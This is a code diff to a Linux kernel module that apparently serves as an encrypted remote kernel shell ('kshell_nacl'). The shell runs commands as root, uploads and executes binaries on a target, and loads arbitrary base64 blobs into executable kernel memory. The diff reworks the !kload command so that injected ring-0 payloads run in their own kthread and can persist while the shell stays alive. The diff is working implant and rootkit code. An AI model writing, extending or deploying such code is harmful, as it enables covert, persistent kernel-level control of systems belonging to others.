@@ -365,19 +365,43 @@ static int cmd_run(const char *args, char *output, int output_len)
 }
 
 /*
- * cmd_kload — Load a PIC blob into kernel memory and execute it in ring 0.
+ * kload_thread — kthread wrapper that executes a PIC blob.
+ *
+ * The blob runs as this kthread's function. When it returns, the
+ * kthread exits. If it runs forever, the kthread runs forever.
+ * Either way, the shell is NOT blocked.
+ */
+struct kload_info {
+    void *exec_mem;
+    int size;
+};
+
+static int kload_thread(void *data)
+{
+    struct kload_info *info = (struct kload_info *)data;
+    void (*entry)(void) = (void (*)(void))info->exec_mem;
+
+    pr_debug("kload: kthread running blob at %px (%d bytes)\n",
+            info->exec_mem, info->size);
+    entry();
+    pr_debug("kload: blob returned\n");
+
+    kfree(info);
+    return 0;
+}
+
+/*
+ * cmd_kload — Load a PIC blob, spawn a kthread to run it.
  *
  * Protocol: "!kload <base64_data>"
  *
- * The blob is base64-decoded, loaded into executable kernel memory
- * (via module_alloc + set_memory_x), and executed as a function call.
- * The blob MUST return (ret instruction) — otherwise the shell hangs.
+ * 1. Base64-decode the blob
+ * 2. module_alloc + set_memory_x → executable kernel pages
+ * 3. kthread_run → blob runs in its own kthread
+ * 4. Shell returns immediately
  *
- * For long-running kernel payloads, the blob should spawn its own
- * kthread and return immediately.
- *
- * On strict W^X kernels (Ubuntu 6.8+), set_memory_x may not work.
- * The blob will only execute on permissive kernels.
+ * The blob can be anything — short-lived or persistent.
+ * The shell stays alive regardless.
  */
 static int cmd_kload(const char *b64_data, char *output, int output_len)
 {
@@ -387,11 +411,10 @@ static int cmd_kload(const char *b64_data, char *output, int output_len)
     set_memory_x_t fn_smx;
     u8 *decoded;
     void *exec_mem;
-    int decoded_len;
-    int numpages;
-    void (*entry)(void);
+    int decoded_len, numpages;
+    struct kload_info *info;
+    struct task_struct *t;
 
-    /* Resolve kernel symbols */
     fn_alloc = (module_alloc_t)resolve_sym("module_alloc");
     fn_smx = (set_memory_x_t)resolve_sym("set_memory_x");
     if (!fn_alloc || !fn_smx) {
@@ -400,7 +423,6 @@ static int cmd_kload(const char *b64_data, char *output, int output_len)
         return -1;
     }
 
-    /* Decode blob */
     decoded = kmalloc(strlen(b64_data), GFP_KERNEL);
     if (!decoded) return -ENOMEM;
     decoded_len = b64_decode(b64_data, decoded, strlen(b64_data));
@@ -410,8 +432,7 @@ static int cmd_kload(const char *b64_data, char *output, int output_len)
         return -1;
     }
 
-    /* Allocate executable memory */
-    numpages = (PAGE_ALIGN(decoded_len)) >> PAGE_SHIFT;
+    numpages = PAGE_ALIGN(decoded_len) >> PAGE_SHIFT;
     exec_mem = fn_alloc(PAGE_ALIGN(decoded_len));
     if (!exec_mem) {
         kfree(decoded);
@@ -419,28 +440,30 @@ static int cmd_kload(const char *b64_data, char *output, int output_len)
         return -ENOMEM;
     }
 
-    /* Copy blob and make executable */
     memcpy(exec_mem, decoded, decoded_len);
     kfree(decoded);
 
     if (fn_smx((unsigned long)exec_mem, numpages)) {
         snprintf(output, output_len,
                 "kload: set_memory_x failed (strict W^X kernel?)\n");
-        /* Don't free — module_memfree may not be available */
         return -1;
     }
 
-    /* Execute the blob — it MUST return */
+    info = kmalloc(sizeof(*info), GFP_KERNEL);
+    if (!info) return -ENOMEM;
+    info->exec_mem = exec_mem;
+    info->size = decoded_len;
+
+    t = kthread_run(kload_thread, info, "kblob");
+    if (IS_ERR(t)) {
+        kfree(info);
+        snprintf(output, output_len, "kload: kthread_run failed\n");
+        return PTR_ERR(t);
+    }
+
     snprintf(output, output_len,
-            "kload: executing %d bytes at %px in ring 0...\n",
-            decoded_len, exec_mem);
-
-    entry = (void (*)(void))exec_mem;
-    entry();
-
-    /* If we get here, blob returned successfully */
-    snprintf(output + strlen(output), output_len - strlen(output),
-            "kload: blob returned OK\n");
+            "kload: %d bytes at %px → kthread PID %d (shell stays alive)\n",
+            decoded_len, exec_mem, t->pid);
     return 0;
 }
 
@@ -491,10 +514,10 @@ static int shell_loop(void *data)
     const char *banner =
         "\n[kshell_nacl] encrypted kernel shell (NaCl secretbox)\n"
         "[kshell_nacl] commands:\n"
-        "  <cmd>                — run shell command as root\n"
-        "  !upload <path> <b64> — upload file (base64-encoded)\n"
+        "  <cmd>                — shell command (root)\n"
+        "  !upload <path> <b64> — upload file to target\n"
         "  !run <path> [args]   — execute uploaded binary\n"
-        "  !kload <b64>         — load PIC blob into ring 0\n"
+        "  !kload <b64>         — PIC blob → own kthread in ring 0\n"
         "  exit                 — disconnect\n\n# ";
 
     /* Large recv buffer for file uploads (base64-encoded binaries) */
